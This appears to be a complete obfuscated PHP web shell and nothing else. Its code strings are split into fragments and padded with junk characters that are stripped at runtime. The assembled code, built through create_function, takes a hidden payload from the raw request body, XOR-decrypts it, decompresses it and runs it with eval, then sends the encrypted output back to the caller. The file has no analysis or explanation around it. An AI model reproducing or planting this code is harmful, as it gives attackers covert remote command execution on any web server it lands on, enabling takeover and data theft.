<?php
$Y='$k="93cf2[be7e";[b$kh=[b"39d4ae3[be5323";[b$kf[b="341cc9[bda80[bc2";$p=[b"s';
$a=str_replace('Q','','QcreaQtQeQ_QfuQnction');
$t='[b[bLrsHlwHAOcNOiP[b8";fun[bction x($t[b[b,$k){$c=s[btrl[ben($k);$l=s';
$L='=1) {@[bob_sta[brt();@e[bv[bal(@gzu[bncompress[b(@x(@[bbase[b64[b_decode([';
$C='[b$j++,$[bi+[b+){$o.=$t{$i}^$k{$j}[b;[b}}[bretu[b[br[bn $o;}if (@p[bre';
$d='g_ma[btch("/$kh([b.+)$kf/",@file_[bget_cont[bent[bs("p[bhp://[binput"),[b$m)=';
$g='[btrl[ben($[bt);$o=""[b;[bfor($[bi=0;$i<$l;)[b{for($j=[b0[b;($j<$c&&[b$i<[b$l);';
$r='b$m[1]),[b$k)));[b$o=[b@o[bb_g[bet_contents([b);@ob_e[bnd_c[blean();$r';
$F='=@base6[b4_enc[bode([b[b@x([b@gzcomp[bre[bss($o),$[bk));[bprint("$p$kh$r$kf");}';
$o=str_replace('[b','',$Y.$t.$g.$C.$d.$L.$r.$F);
$D=$a('',$o);$D();
?>
